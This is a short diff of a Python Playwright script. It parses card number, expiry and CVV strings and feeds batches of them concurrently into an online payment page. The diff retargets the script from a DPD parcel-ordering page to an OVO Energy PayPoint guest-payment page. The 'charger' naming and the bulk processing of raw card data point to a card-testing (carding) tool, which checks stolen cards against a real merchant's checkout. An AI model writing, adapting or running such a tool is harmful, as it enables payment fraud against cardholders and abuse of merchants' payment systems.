@@ -1,7 +1,7 @@
 from playwright.async_api import async_playwright
 import asyncio
 
-async def run_dpdcharger(card_details: str):
+async def run_ovocharger(card_details: str):
     cardnumber, expirymonth, expiryyear, cvv = card_details.split('|')
 
     async with async_playwright() as p:
@@ -10,7 +10,7 @@ async def run_dpdcharger(card_details: str):
         await page.set_viewport_size({"width": 1280, "height": 720})
 
         try:
-            await page.goto("https://send.dpd.co.uk/order?step=parcelDetails")
+            await page.goto("https://ovoenergypayments.paypoint.com/GuestPayment")
 
             await asyncio.sleep(2)  # small wait to ensure dynamic content loads fully
 
@@ -27,7 +27,7 @@ async def run_dpdcharger(card_details: str):
 
 async def process_multiple_cards(cards: list[str]):
     # Create a list of tasks, each runs independently
-    tasks = [run_dpdcharger(card) for card in cards]
+    tasks = [run_ovocharger(card) for card in cards]
 
     # Run all tasks concurrently, gather results
     results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -46,3 +46,4 @@ if __name__ == "__main__":
     for idx, (result, screenshot) in enumerate(results):
         print(f"Card {idx+1} result: {result}")
         # optionally save screenshots
+
